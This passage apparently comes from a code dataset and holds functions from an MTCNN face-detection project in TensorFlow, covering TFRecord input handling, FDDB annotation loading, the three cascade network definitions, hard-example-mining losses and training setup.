    images = tf.concat([pos_image, part_image, neg_image, landmark_image], 0, name='concat/image')
    print(images.get_shape())
    labels = tf.concat([pos_label, part_label, neg_label, landmark_label], 0, name='concat/label')
    print
    assert isinstance(labels, object)
    labels.get_shape()
    rois = tf.concat([pos_roi, part_roi, neg_roi, landmark_roi], 0, name='concat/roi')
    print(rois.get_shape())
    landmarks = tf.concat([pos_landmark, part_landmark, neg_landmark, landmark_landmark], 0, name='concat/landmark')
    return (images, labels, rois, landmarks)"
AITTSMD/MTCNN-Tensorflow,read,"def read():
    BATCH_SIZE = 64
    net = 'PNet'
    dataset_dir = 'imglists/PNet'
    landmark_dir = os.path.join(dataset_dir, 'train_PNet_ALL_few.tfrecord_shuffle')
    (images, labels, rois, landmarks) = read_single_tfrecord(landmark_dir, BATCH_SIZE, net)
    ""\n    pos_dir = os.path.join(dataset_dir,'pos.tfrecord_shuffle')\n    part_dir = os.path.join(dataset_dir,'part.tfrecord_shuffle')\n    neg_dir = os.path.join(dataset_dir,'neg.tfrecord_shuffle')\n    dataset_dirs = [pos_dir,part_dir,neg_dir]\n    pos_radio = 1.0/5;part_radio = 1.0/5;neg_radio=3.0/5\n    batch_sizes = [int(np.ceil(BATCH_SIZE*pos_radio)),int(np.ceil(BATCH_SIZE*part_radio)),int(np.ceil(BATCH_SIZE*neg_radio))]\n    images, labels, rois = read_multi_tfrecords(dataset_dirs,batch_sizes, net)\n    ""
    with tf.Session() as sess:
        i = 0
        coord = tf.train.Coordinator()
        threads = tf.train.start_queue_runners(coord=coord)
        try:
            while not coord.should_stop() and i < 1:
                (im_batch, label_batch, roi_batch, landmark_batch) = sess.run([images, labels, rois, landmarks])
                i += 1
        except tf.errors.OutOfRangeError:
            print('完成！！！')
        finally:
            coord.request_stop()
        coord.join(threads)
    num_landmark = len(np.where(label_batch == -2)[0])
    print(num_landmark)
    (num_batch, h, w, c) = im_batch.shape
    for i in range(num_batch):
        cc = cv2.resize(im_batch[i], (120, 120))
        print(label_batch)
        for j in range(5):
            cv2.circle(cc, (int(landmark_batch[i][2 * j] * 120), int(landmark_batch[i][2 * j + 1] * 120)), 3, (0, 0, 255))
        cv2.imshow('lala', cc)
        cv2.waitKey()"
AITTSMD/MTCNN-Tensorflow,_int64_feature,"def _int64_feature(value):
    """"""Wrapper for insert int64 feature into Example proto.""""""
    if not isinstance(value, list):
        value = [value]
    return tf.train.Feature(int64_list=tf.train.Int64List(value=value))"
AITTSMD/MTCNN-Tensorflow,_float_feature,"def _float_feature(value):
    """"""Wrapper for insert float features into Example proto.""""""
    if not isinstance(value, list):
        value = [value]
    return tf.train.Feature(float_list=tf.train.FloatList(value=value))"
AITTSMD/MTCNN-Tensorflow,_bytes_feature,"def _bytes_feature(value):
    """"""Wrapper for insert bytes features into Example proto.""""""
    if not isinstance(value, list):
        value = [value]
    return tf.train.Feature(bytes_list=tf.train.BytesList(value=value))"
AITTSMD/MTCNN-Tensorflow,_convert_to_example,"def _convert_to_example(image_example, image_buffer, colorspace=b'RGB', channels=3, image_format=b'JPEG'):
    """"""
    covert to tfrecord file
    :param image_example: dict, an image example
    :param image_buffer: string, JPEG encoding of RGB image
    :param colorspace:
    :param channels:
    :param image_format:
    :return:
    Example proto
    """"""
    class_label = image_example['label']
    image_bboxes = image_example.get('bbox', {})
    xmin = image_bboxes.get('xmin', [])
    xmax = image_bboxes.get('xmax', [])
    ymin = image_bboxes.get('ymin', [])
    ymax = image_bboxes.get('ymax', [])
    example = tf.train.Example(features=tf.train.Features(feature={'image/colorspace': _bytes_feature(colorspace), 'image/channels': _int64_feature(channels), 'image/format': _bytes_feature(image_format), 'image/encoded': _bytes_feature(image_buffer), 'image/label': _int64_feature(class_label), 'image/image_bbox/xmin': _float_feature(xmin), 'image/image_bbox/ymin': _float_feature(ymin), 'image/image_bbox/xmax': _float_feature(xmax), 'image/image_bbox/ymax': _float_feature(ymax)}))
    return example"
AITTSMD/MTCNN-Tensorflow,_convert_to_example_simple,"def _convert_to_example_simple(image_example, image_buffer):
    """"""
    covert to tfrecord file
    :param image_example: dict, an image example
    :param image_buffer: string, JPEG encoding of RGB image
    :param colorspace:
    :param channels:
    :param image_format:
    :return:
    Example proto
    """"""
    class_label = image_example['label']
    bbox = image_example['bbox']
    roi = [bbox['xmin'], bbox['ymin'], bbox['xmax'], bbox['ymax']]
    landmark = [bbox['xlefteye'], bbox['ylefteye'], bbox['xrighteye'], bbox['yrighteye'], bbox['xnose'], bbox['ynose'], bbox['xleftmouth'], bbox['yleftmouth'], bbox['xrightmouth'], bbox['yrightmouth']]
    example = tf.train.Example(features=tf.train.Features(feature={'image/encoded': _bytes_feature(image_buffer), 'image/label': _int64_feature(class_label), 'image/roi': _float_feature(roi), 'image/landmark': _float_feature(landmark)}))
    return example"
AITTSMD/MTCNN-Tensorflow,_is_png,"def _is_png(filename):
    """"""Determine if a file contains a PNG format image.
    Args:
      filename: string, path of the image file.
    Returns:
      boolean indicating if the image is a PNG.
    """"""
    (_, file_extension) = os.path.splitext(filename)
    return file_extension.lower() == '.png'"
AITTSMD/MTCNN-Tensorflow,_process_image,"def _process_image(filename, coder):
    """"""Process a single image file.
    Args:
      filename: string, path to an image file e.g., '/path/to/example.JPG'.
      coder: instance of ImageCoder to provide TensorFlow image coding utils.
    Returns:
      image_buffer: string, JPEG encoding of RGB image.
      height: integer, image height in pixels.
      width: integer, image width in pixels.
    """"""
    filename = filename + '.jpg'
    print(filename)
    image = cv2.imread(filename)
    image_data = image.tostring()
    if _is_png(filename):
        print(filename, 'to convert jpeg')
        image_data = coder.png_to_jpeg(image_data)
    assert len(image.shape) == 3
    height = image.shape[0]
    width = image.shape[1]
    assert image.shape[2] == 3
    return (image_data, height, width)"
AITTSMD/MTCNN-Tensorflow,_process_image_withoutcoder,"def _process_image_withoutcoder(filename):
    image = cv2.imread(filename)
    image_data = image.tostring()
    assert len(image.shape) == 3
    height = image.shape[0]
    width = image.shape[1]
    assert image.shape[2] == 3
    return (image_data, height, width)"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self):
    self._sess = tf.Session()
    self._png_data = tf.placeholder(dtype=tf.string)
    image = tf.image.decode_png(self._png_data, channels=3)
    self._png_to_jpeg = tf.image.encode_jpeg(image, format='rgb', quality=100)
    self._decode_jpeg_data = tf.placeholder(dtype=tf.string)
    self._decode_jpeg = tf.image.decode_jpeg(self._decode_jpeg_data, channels=3)"
AITTSMD/MTCNN-Tensorflow,png_to_jpeg,"def png_to_jpeg(self, image_data):
    return self._sess.run(self._png_to_jpeg, feed_dict={self._png_data: image_data})"
AITTSMD/MTCNN-Tensorflow,decode_jpeg,"def decode_jpeg(self, image_data):
    image = self._sess.run(self._decode_jpeg, feed_dict={self._decode_jpeg_data: image_data})
    assert len(image.shape) == 3, 'JPEG needs to have height x width x channels'
    assert image.shape[2] == 3, 'JPEG needs to have 3 channels (RGB)'
    return image"
AITTSMD/MTCNN-Tensorflow,IoU,"def IoU(box, boxes):
    """"""Compute IoU between detect box and gt boxes

    Parameters:
    ----------
    box: numpy array , shape (5, ): x1, y1, x2, y2, score
        predicted boxes
    boxes: numpy array, shape (n, 4): x1, y1, x2, y2
        input ground truth boxes

    Returns:
    -------
    ovr: numpy.array, shape (n, )
        IoU
    """"""
    box_area = (box[2] - box[0] + 1) * (box[3] - box[1] + 1)
    area = (boxes[:, 2] - boxes[:, 0] + 1) * (boxes[:, 3] - boxes[:, 1] + 1)
    xx1 = np.maximum(box[0], boxes[:, 0])
    yy1 = np.maximum(box[1], boxes[:, 1])
    xx2 = np.minimum(box[2], boxes[:, 2])
    yy2 = np.minimum(box[3], boxes[:, 3])
    w = np.maximum(0, xx2 - xx1 + 1)
    h = np.maximum(0, yy2 - yy1 + 1)
    inter = w * h
    ovr = inter / (box_area + area - inter)
    return ovr"
AITTSMD/MTCNN-Tensorflow,convert_to_square,"def convert_to_square(bbox):
    """"""Convert bbox to square

    Parameters:
    ----------
    bbox: numpy array , shape n x 5
        input bbox

    Returns:
    -------
    square bbox
    """"""
    square_bbox = bbox.copy()
    h = bbox[:, 3] - bbox[:, 1] + 1
    w = bbox[:, 2] - bbox[:, 0] + 1
    max_side = np.maximum(h, w)
    square_bbox[:, 0] = bbox[:, 0] + w * 0.5 - max_side * 0.5
    square_bbox[:, 1] = bbox[:, 1] + h * 0.5 - max_side * 0.5
    square_bbox[:, 2] = square_bbox[:, 0] + max_side - 1
    square_bbox[:, 3] = square_bbox[:, 1] + max_side - 1
    return square_bbox"
AITTSMD/MTCNN-Tensorflow,get_imdb_fddb,"def get_imdb_fddb(data_dir):
    imdb = []
    nfold = 10
    for n in range(nfold):
        file_name = 'FDDB-folds/FDDB-folds/FDDB-fold-%02d.txt' % (n + 1)
        file_name = os.path.join(data_dir, file_name)
        fid = open(file_name, 'r')
        image_names = []
        for im_name in fid.readlines():
            image_names.append(im_name.strip('\n'))
        imdb.append(image_names)
    return imdb"
AITTSMD/MTCNN-Tensorflow,read_gt_bbox,"def read_gt_bbox(raw_list):
    list_len = len(raw_list)
    bbox_num = (list_len - 1) // 4
    idx = 1
    bboxes = np.zeros((bbox_num, 4), dtype=int)
    for i in range(4):
        for j in range(bbox_num):
            bboxes[j][i] = int(raw_list[idx])
            idx += 1
    return bboxes"
AITTSMD/MTCNN-Tensorflow,get_image_info,"def get_image_info(anno_file):
    f = open(anno_file, 'r')
    image_info = []
    for line in f:
        ct_list = line.strip().split(' ')
        path = ct_list[0]
        path_list = path.split('\\')
        event = path_list[0]
        name = path_list[1]
        bboxes = read_gt_bbox(ct_list)
        image_info.append([event, name, bboxes])
    print('total number of images in validation set: ', len(image_info))
    return image_info"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, name, image_set, root_path, dataset_path, mode='train'):
    self.name = name + '_' + image_set
    print(self.name)
    self.image_set = image_set
    self.root_path = root_path
    self.data_path = dataset_path
    self.mode = mode
    self.classes = ['__background__', 'face']
    self.num_classes = 2
    self.image_set_index = self.load_image_set_index()
    self.num_images = len(self.image_set_index)"
AITTSMD/MTCNN-Tensorflow,cache_path,"@property
def cache_path(self):
    """"""Make a directory to store all caches

        Parameters:
        ----------
        Returns:
        -------
        cache_path: str
            directory to store caches
        """"""
    cache_path = os.path.join(self.root_path, 'cache')
    if not os.path.exists(cache_path):
        os.mkdir(cache_path)
    return cache_path"
AITTSMD/MTCNN-Tensorflow,load_image_set_index,"def load_image_set_index(self):
    """"""Get image index

        Parameters:
        ----------
        Returns:
        -------
        image_set_index: str
            relative path of image
        """"""
    image_set_index_file = os.path.join(self.data_path, 'imglists', self.image_set + '.txt')
    print('image_set_index_file', image_set_index_file)
    assert os.path.exists(image_set_index_file), 'Path does not exist: {}'.format(image_set_index_file)
    with open(image_set_index_file, 'r') as f:
        image_set_index = [x.strip().split(' ')[0] for x in f.readlines()]
    return image_set_index"
AITTSMD/MTCNN-Tensorflow,gt_imdb,"def gt_imdb(self):
    """"""Get and save ground truth image database

        Parameters:
        ----------
        Returns:
        -------
        gt_imdb: dict
            image database with annotations
        """"""
    gt_imdb = self.load_annotations()
    return gt_imdb"
AITTSMD/MTCNN-Tensorflow,image_path_from_index,"def image_path_from_index(self, index):
    """"""Given image index, return full path

        Parameters:
        ----------
        index: str
            relative path of image
        Returns:
        -------
        image_file: str
            full path of image
        """"""
    if not os.path.exists(index):
        image_file = os.path.join(self.data_path, index)
    else:
        image_file = index
    if not image_file.endswith('.jpg'):
        image_file = image_file + '.jpg'
    assert os.path.exists(image_file), 'Path does not exist: {}'.format(image_file)
    return image_file"
AITTSMD/MTCNN-Tensorflow,load_annotations,"def load_annotations(self):
    """"""Load annotations

        Parameters:
        ----------
        Returns:
        -------
        imdb: dict
            image database with annotations
        """"""
    annotation_file = os.path.join(self.data_path, 'imglists', self.image_set + '.txt')
    print(os.path.join(self.data_path, 'imglists', self.image_set + '.txt'))
    assert os.path.exists(annotation_file), 'annotations not found at {}'.format(annotation_file)
    print('开始读取annotation文件', annotation_file)
    with open(annotation_file, 'r') as f:
        annotations = f.readlines()
    imdb = []
    print(self.num_images)
    for i in range(self.num_images):
        annotation = annotations[i].strip().split(' ')
        index = annotation[0]
        if (int(i) + 1) % 10000 == 0:
            print('index:', index)
        im_path = self.image_path_from_index(index)
        imdb_ = dict()
        imdb_['image'] = im_path
        if self.mode == 'test':
            pass
        else:
            label = annotation[1]
            imdb_['label'] = int(label)
            imdb_['flipped'] = False
            imdb_['bbox_target'] = np.zeros((4,))
            if len(annotation[2:]) == 4:
                bbox_target = annotation[2:]
                imdb_['bbox_target'] = np.array(bbox_target).astype(float)
        imdb.append(imdb_)
    return imdb"
AITTSMD/MTCNN-Tensorflow,append_flipped_images,"def append_flipped_images(self, imdb):
    """"""append flipped images to imdb

        Parameters:
        ----------
        imdb: imdb
            image database
        Returns:
        -------
        imdb: dict
            image database with flipped image annotations added
        """"""
    print('append flipped images to imdb', len(imdb))
    for i in range(len(imdb)):
        imdb_ = imdb[i]
        m_bbox = imdb_['bbox_target'].copy()
        (m_bbox[0], m_bbox[2]) = (-m_bbox[2], -m_bbox[0])
        entry = {'image': imdb_['image'], 'label': imdb_['label'], 'bbox_target': m_bbox, 'flipped': True}
        imdb.append(entry)
    self.image_set_index *= 2
    return imdb"
AITTSMD/MTCNN-Tensorflow,write_results,"def write_results(self, all_boxes):
    """"""write results

        Parameters:
        ----------
        all_boxes: list of numpy.ndarray
            detection results
        Returns:
        -------
        """"""
    print('Writing fddb results')
    res_folder = os.path.join('./FDDB', 'results')
    if not os.path.exists(res_folder):
        os.makedirs(res_folder)
    filename = os.path.join(res_folder, self.image_set + '-out.txt')
    with open(filename, 'w') as f:
        for (im_ind, index) in enumerate(self.image_set_index):
            f.write('%s\n' % index)
            dets = all_boxes[im_ind]
            f.write('%d\n' % dets.shape[0])
            if len(dets) == 0:
                continue
            for k in range(dets.shape[0]):
                f.write('{:.2f} {:.2f} {:.2f} {:.2f} {:.5f}\n'.format(dets[k, 0], dets[k, 1], dets[k, 2] - dets[k, 0], dets[k, 3] - dets[k, 1], dets[k, 4]))"
AITTSMD/MTCNN-Tensorflow,get_file_names,"def get_file_names(data_dir, f_type):
    file_names = []
    nfold = 10
    for n in range(nfold):
        if f_type == 0:
            file_name = 'FDDB-fold-%02d.txt' % (n + 1)
        if f_type == 1:
            file_name = 'FDDB-fold-%02d-ellipseList.txt' % (n + 1)
        if f_type == 2:
            file_name = 'FDDB-det-fold-%02d.txt' % (n + 1)
        file_name = os.path.join(data_dir, file_name)
        file_names.append(file_name)
    return file_names"
AITTSMD/MTCNN-Tensorflow,merge_files,"def merge_files(file_names, output_file_name):
    output_file_name = output_file_name
    output_file = open(output_f_name, 'w')
    for file_name in file_names:
        fid = open(file_name, mode='r')
        for line in fid:
            output_file.writelines(line)
        print(file_name, ' done')
    output_file.close()"
AITTSMD/MTCNN-Tensorflow,prelu,"def prelu(inputs):
    alphas = tf.get_variable('alphas', shape=inputs.get_shape()[-1], dtype=tf.float32, initializer=tf.constant_initializer(0.25))
    pos = tf.nn.relu(inputs)
    neg = alphas * (inputs - abs(inputs)) * 0.5
    return pos + neg"
AITTSMD/MTCNN-Tensorflow,dense_to_one_hot,"def dense_to_one_hot(labels_dense, num_classes):
    num_labels = labels_dense.shape[0]
    index_offset = np.arange(num_labels) * num_classes
    labels_one_hot = np.zeros((num_labels, num_classes))
    labels_one_hot.flat[index_offset + labels_dense.ravel()] = 1
    return labels_one_hot"
AITTSMD/MTCNN-Tensorflow,cls_ohem,"def cls_ohem(cls_prob, label):
    zeros = tf.zeros_like(label)
    label_filter_invalid = tf.where(tf.less(label, 0), zeros, label)
    num_cls_prob = tf.size(cls_prob)
    cls_prob_reshape = tf.reshape(cls_prob, [num_cls_prob, -1])
    label_int = tf.cast(label_filter_invalid, tf.int32)
    num_row = tf.to_int32(cls_prob.get_shape()[0])
    row = tf.range(num_row) * 2
    indices_ = row + label_int
    label_prob = tf.squeeze(tf.gather(cls_prob_reshape, indices_))
    loss = -tf.log(label_prob + 1e-10)
    zeros = tf.zeros_like(label_prob, dtype=tf.float32)
    ones = tf.ones_like(label_prob, dtype=tf.float32)
    valid_inds = tf.where(label < zeros, zeros, ones)
    num_valid = tf.reduce_sum(valid_inds)
    keep_num = tf.cast(num_valid * num_keep_radio, dtype=tf.int32)
    loss = loss * valid_inds
    (loss, _) = tf.nn.top_k(loss, k=keep_num)
    return tf.reduce_mean(loss)"
AITTSMD/MTCNN-Tensorflow,bbox_ohem_smooth_L1_loss,"def bbox_ohem_smooth_L1_loss(bbox_pred, bbox_target, label):
    sigma = tf.constant(1.0)
    threshold = 1.0 / sigma ** 2
    zeros_index = tf.zeros_like(label, dtype=tf.float32)
    valid_inds = tf.where(label != zeros_index, tf.ones_like(label, dtype=tf.float32), zeros_index)
    abs_error = tf.abs(bbox_pred - bbox_target)
    loss_smaller = 0.5 * (abs_error * sigma) ** 2
    loss_larger = abs_error - 0.5 / sigma ** 2
    smooth_loss = tf.reduce_sum(tf.where(abs_error < threshold, loss_smaller, loss_larger), axis=1)
    keep_num = tf.cast(tf.reduce_sum(valid_inds) * num_keep_radio, dtype=tf.int32)
    smooth_loss = smooth_loss * valid_inds
    (_, k_index) = tf.nn.top_k(smooth_loss, k=keep_num)
    smooth_loss_picked = tf.gather(smooth_loss, k_index)
    return tf.reduce_mean(smooth_loss_picked)"
AITTSMD/MTCNN-Tensorflow,bbox_ohem_orginal,"def bbox_ohem_orginal(bbox_pred, bbox_target, label):
    zeros_index = tf.zeros_like(label, dtype=tf.float32)
    valid_inds = tf.where(label != zeros_index, tf.ones_like(label, dtype=tf.float32), zeros_index)
    square_error = tf.reduce_sum(tf.square(bbox_pred - bbox_target), axis=1)
    keep_num = tf.cast(tf.reduce_sum(valid_inds) * num_keep_radio, dtype=tf.int32)
    square_error = square_error * valid_inds
    (_, k_index) = tf.nn.top_k(square_error, k=keep_num)
    square_error = tf.gather(square_error, k_index)
    return tf.reduce_mean(square_error)"
AITTSMD/MTCNN-Tensorflow,bbox_ohem,"def bbox_ohem(bbox_pred, bbox_target, label):
    """"""

    :param bbox_pred:
    :param bbox_target:
    :param label: class label
    :return: mean euclidean loss for all the pos and part examples
    """"""
    zeros_index = tf.zeros_like(label, dtype=tf.float32)
    ones_index = tf.ones_like(label, dtype=tf.float32)
    valid_inds = tf.where(tf.equal(tf.abs(label), 1), ones_index, zeros_index)
    square_error = tf.square(bbox_pred - bbox_target)
    square_error = tf.reduce_sum(square_error, axis=1)
    num_valid = tf.reduce_sum(valid_inds)
    keep_num = tf.cast(num_valid, dtype=tf.int32)
    square_error = square_error * valid_inds
    (_, k_index) = tf.nn.top_k(square_error, k=keep_num)
    square_error = tf.gather(square_error, k_index)
    return tf.reduce_mean(square_error)"
AITTSMD/MTCNN-Tensorflow,landmark_ohem,"def landmark_ohem(landmark_pred, landmark_target, label):
    """"""

    :param landmark_pred:
    :param landmark_target:
    :param label:
    :return: mean euclidean loss
    """"""
    ones = tf.ones_like(label, dtype=tf.float32)
    zeros = tf.zeros_like(label, dtype=tf.float32)
    valid_inds = tf.where(tf.equal(label, -2), ones, zeros)
    square_error = tf.square(landmark_pred - landmark_target)
    square_error = tf.reduce_sum(square_error, axis=1)
    num_valid = tf.reduce_sum(valid_inds)
    keep_num = tf.cast(num_valid, dtype=tf.int32)
    square_error = square_error * valid_inds
    (_, k_index) = tf.nn.top_k(square_error, k=keep_num)
    square_error = tf.gather(square_error, k_index)
    return tf.reduce_mean(square_error)"
AITTSMD/MTCNN-Tensorflow,cal_accuracy,"def cal_accuracy(cls_prob, label):
    """"""

    :param cls_prob:
    :param label:
    :return:calculate classification accuracy for pos and neg examples only
    """"""
    pred = tf.argmax(cls_prob, axis=1)
    label_int = tf.cast(label, tf.int64)
    cond = tf.where(tf.greater_equal(label_int, 0))
    picked = tf.squeeze(cond)
    label_picked = tf.gather(label_int, picked)
    pred_picked = tf.gather(pred, picked)
    accuracy_op = tf.reduce_mean(tf.cast(tf.equal(label_picked, pred_picked), tf.float32))
    return accuracy_op"
AITTSMD/MTCNN-Tensorflow,_activation_summary,"def _activation_summary(x):
    """"""
    creates a summary provides histogram of activations
    creates a summary that measures the sparsity of activations

    :param x: Tensor
    :return:
    """"""
    tensor_name = x.op.name
    print('load summary for : ', tensor_name)
    tf.summary.histogram(tensor_name + '/activations', x)"
AITTSMD/MTCNN-Tensorflow,P_Net,"def P_Net(inputs, label=None, bbox_target=None, landmark_target=None, training=True):
    with slim.arg_scope([slim.conv2d], activation_fn=prelu, weights_initializer=slim.xavier_initializer(), biases_initializer=tf.zeros_initializer(), weights_regularizer=slim.l2_regularizer(0.0005), padding='valid'):
        print(inputs.get_shape())
        net = slim.conv2d(inputs, 10, 3, stride=1, scope='conv1')
        _activation_summary(net)
        print(net.get_shape())
        net = slim.max_pool2d(net, kernel_size=[2, 2], stride=2, scope='pool1', padding='SAME')
        _activation_summary(net)
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=16, kernel_size=[3, 3], stride=1, scope='conv2')
        _activation_summary(net)
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=32, kernel_size=[3, 3], stride=1, scope='conv3')
        _activation_summary(net)
        print(net.get_shape())
        conv4_1 = slim.conv2d(net, num_outputs=2, kernel_size=[1, 1], stride=1, scope='conv4_1', activation_fn=tf.nn.softmax)
        _activation_summary(conv4_1)
        print(conv4_1.get_shape())
        bbox_pred = slim.conv2d(net, num_outputs=4, kernel_size=[1, 1], stride=1, scope='conv4_2', activation_fn=None)
        _activation_summary(bbox_pred)
        print(bbox_pred.get_shape())
        landmark_pred = slim.conv2d(net, num_outputs=10, kernel_size=[1, 1], stride=1, scope='conv4_3', activation_fn=None)
        _activation_summary(landmark_pred)
        print(landmark_pred.get_shape())
        if training:
            cls_prob = tf.squeeze(conv4_1, [1, 2], name='cls_prob')
            cls_loss = cls_ohem(cls_prob, label)
            bbox_pred = tf.squeeze(bbox_pred, [1, 2], name='bbox_pred')
            bbox_loss = bbox_ohem(bbox_pred, bbox_target, label)
            landmark_pred = tf.squeeze(landmark_pred, [1, 2], name='landmark_pred')
            landmark_loss = landmark_ohem(landmark_pred, landmark_target, label)
            accuracy = cal_accuracy(cls_prob, label)
            L2_loss = tf.add_n(slim.losses.get_regularization_losses())
            return (cls_loss, bbox_loss, landmark_loss, L2_loss, accuracy)
        else:
            cls_pro_test = tf.squeeze(conv4_1, axis=0)
            bbox_pred_test = tf.squeeze(bbox_pred, axis=0)
            landmark_pred_test = tf.squeeze(landmark_pred, axis=0)
            return (cls_pro_test, bbox_pred_test, landmark_pred_test)"
AITTSMD/MTCNN-Tensorflow,R_Net,"def R_Net(inputs, label=None, bbox_target=None, landmark_target=None, training=True):
    with slim.arg_scope([slim.conv2d], activation_fn=prelu, weights_initializer=slim.xavier_initializer(), biases_initializer=tf.zeros_initializer(), weights_regularizer=slim.l2_regularizer(0.0005), padding='valid'):
        print(inputs.get_shape())
        net = slim.conv2d(inputs, num_outputs=28, kernel_size=[3, 3], stride=1, scope='conv1')
        print(net.get_shape())
        net = slim.max_pool2d(net, kernel_size=[3, 3], stride=2, scope='pool1', padding='SAME')
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=48, kernel_size=[3, 3], stride=1, scope='conv2')
        print(net.get_shape())
        net = slim.max_pool2d(net, kernel_size=[3, 3], stride=2, scope='pool2')
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=64, kernel_size=[2, 2], stride=1, scope='conv3')
        print(net.get_shape())
        fc_flatten = slim.flatten(net)
        print(fc_flatten.get_shape())
        fc1 = slim.fully_connected(fc_flatten, num_outputs=128, scope='fc1')
        print(fc1.get_shape())
        cls_prob = slim.fully_connected(fc1, num_outputs=2, scope='cls_fc', activation_fn=tf.nn.softmax)
        print(cls_prob.get_shape())
        bbox_pred = slim.fully_connected(fc1, num_outputs=4, scope='bbox_fc', activation_fn=None)
        print(bbox_pred.get_shape())
        landmark_pred = slim.fully_connected(fc1, num_outputs=10, scope='landmark_fc', activation_fn=None)
        print(landmark_pred.get_shape())
        if training:
            cls_loss = cls_ohem(cls_prob, label)
            bbox_loss = bbox_ohem(bbox_pred, bbox_target, label)
            accuracy = cal_accuracy(cls_prob, label)
            landmark_loss = landmark_ohem(landmark_pred, landmark_target, label)
            L2_loss = tf.add_n(slim.losses.get_regularization_losses())
            return (cls_loss, bbox_loss, landmark_loss, L2_loss, accuracy)
        else:
            return (cls_prob, bbox_pred, landmark_pred)"
AITTSMD/MTCNN-Tensorflow,O_Net,"def O_Net(inputs, label=None, bbox_target=None, landmark_target=None, training=True):
    with slim.arg_scope([slim.conv2d], activation_fn=prelu, weights_initializer=slim.xavier_initializer(), biases_initializer=tf.zeros_initializer(), weights_regularizer=slim.l2_regularizer(0.0005), padding='valid'):
        print(inputs.get_shape())
        net = slim.conv2d(inputs, num_outputs=32, kernel_size=[3, 3], stride=1, scope='conv1')
        print(net.get_shape())
        net = slim.max_pool2d(net, kernel_size=[3, 3], stride=2, scope='pool1', padding='SAME')
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=64, kernel_size=[3, 3], stride=1, scope='conv2')
        print(net.get_shape())
        net = slim.max_pool2d(net, kernel_size=[3, 3], stride=2, scope='pool2')
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=64, kernel_size=[3, 3], stride=1, scope='conv3')
        print(net.get_shape())
        net = slim.max_pool2d(net, kernel_size=[2, 2], stride=2, scope='pool3', padding='SAME')
        print(net.get_shape())
        net = slim.conv2d(net, num_outputs=128, kernel_size=[2, 2], stride=1, scope='conv4')
        print(net.get_shape())
        fc_flatten = slim.flatten(net)
        print(fc_flatten.get_shape())
        fc1 = slim.fully_connected(fc_flatten, num_outputs=256, scope='fc1')
        print(fc1.get_shape())
        cls_prob = slim.fully_connected(fc1, num_outputs=2, scope='cls_fc', activation_fn=tf.nn.softmax)
        print(cls_prob.get_shape())
        bbox_pred = slim.fully_connected(fc1, num_outputs=4, scope='bbox_fc', activation_fn=None)
        print(bbox_pred.get_shape())
        landmark_pred = slim.fully_connected(fc1, num_outputs=10, scope='landmark_fc', activation_fn=None)
        print(landmark_pred.get_shape())
        if training:
            cls_loss = cls_ohem(cls_prob, label)
            bbox_loss = bbox_ohem(bbox_pred, bbox_target, label)
            accuracy = cal_accuracy(cls_prob, label)
            landmark_loss = landmark_ohem(landmark_pred, landmark_target, label)
            L2_loss = tf.add_n(slim.losses.get_regularization_losses())
            return (cls_loss, bbox_loss, landmark_loss, L2_loss, accuracy)
        else:
            return (cls_prob, bbox_pred, landmark_pred)"
AITTSMD/MTCNN-Tensorflow,train_model,"def train_model(base_lr, loss, data_num):
    """"""
    train model
    :param base_lr: base learning rate
    :param loss: loss
    :param data_num:
    :return:
    train_op, lr_op
    """"""
    lr_factor = 0.1
    global_step = tf.Variable(0, trainable=False)
    boundaries = [int(epoch * data_num / config.BATCH_SIZE) for epoch in config.LR_EPOCH]
    lr_values = [base_lr * lr_factor ** x for x in range(0, len(config.LR_EPOCH) + 1)]
    lr_op = tf.train.piecewise_constant(global_step, boundaries, lr_values)
    optimizer = tf.train.MomentumOptimizer(lr_op, 0.9)
    train_op = optimizer.minimize(loss, global_step)
    return (train_op, lr_op)"
AITTSMD/MTCNN-Tensorflow,random_flip_images,"def random_flip_images(image_batch, label_batch, landmark_batch):
    if random.choice([0, 1]) > 0:
        num_images = image_batch.shape[0]
        fliplandmarkindexes = np.where(label_batch == -2)[0]
        flipposindexes = np.where(label_batch == 1)[0]
        flipindexes = np.concatenate((fliplandmarkindexes, flipposindexes))
        for i in flipindexes:
            cv2.flip(image_batch[i], 1, image_batch[i])
        for i in fliplandmarkindexes:
            landmark_ = landmark_batch[i].reshape((-1, 2))
            landmark_ = np.asarray([(1 - x, y) for (x, y) in landmark_])
            landmark_[[0, 1]] = landmark_[[1, 0]]
            landmark_[[3, 4]] = landmark_[[4, 3]]
            landmark_batch[i] = landmark_.ravel()
    return (image_batch, landmark_batch)"
AITTSMD/MTCNN-Tensorflow,image_color_distort,"def image_color_distort(inputs):
    inputs = tf.image.random_contrast(inputs, lower=0.5, upper=1.5)
    inputs = tf.image.random_brightness(inputs, max_delta=0.2)
    inputs = tf.image.random_hue(inputs, max_delta=0.2)
    inputs = tf.image.random_saturation(inputs, lower=0.5, upper=1.5)
    return inputs"
AITTSMD/MTCNN-Tensorflow,train,"def train(net_factory, prefix, end_epoch, base_dir, display=200, base_lr=0.01):
    """"""
    train PNet/RNet/ONet
    :param net_factory:
    :param prefix: model path
    :param end_epoch:
    :param dataset:
    :param display:
    :param base_lr:
    :return:
    """"""
    net = prefix.split('/')[-1]
    label_file = os.path.join(base_dir, 'train_%s_landmark.txt' % net)
    print(label_file)
    f = open(label_file, 'r')
    num = len(f.readlines())
    print('Total size of the dataset is: ', num)
    print(prefix)
    if net == 'PNet':
        dataset_dir = os.path.join(base_dir, 'train_%s_landmark.tfrecord_shuffle' % net)
        print('dataset dir is:', dataset_dir)
        (image_batch, label_batch, bbox_batch, landmark_batch) = read_single_tfrecord(dataset_dir, config.BATCH_SIZE, net)
    else:
        pos_dir = os.path.join(base_dir, 'pos_landmark.tfrecord_shuffle')
        part_dir = os.path.join(base_dir, 'part_landmark.tfrecord_shuffle')
        neg_dir = os.path.join(base_dir, 'neg_landmark.tfrecord_shuffle')
        landmark_dir = os.path.join('../../DATA/imglists/RNet', 'landmark_landmark.tfrecord_shuffle')
        dataset_dirs = [pos_dir, part_dir, neg_dir, landmark_dir]
        pos_radio = 1.0 / 6
        part_radio = 1.0 / 6
        landmark_radio = 1.0 / 6
        neg_radio = 3.0 / 6
        pos_batch_size = int(np.ceil(config.BATCH_SIZE * pos_radio))
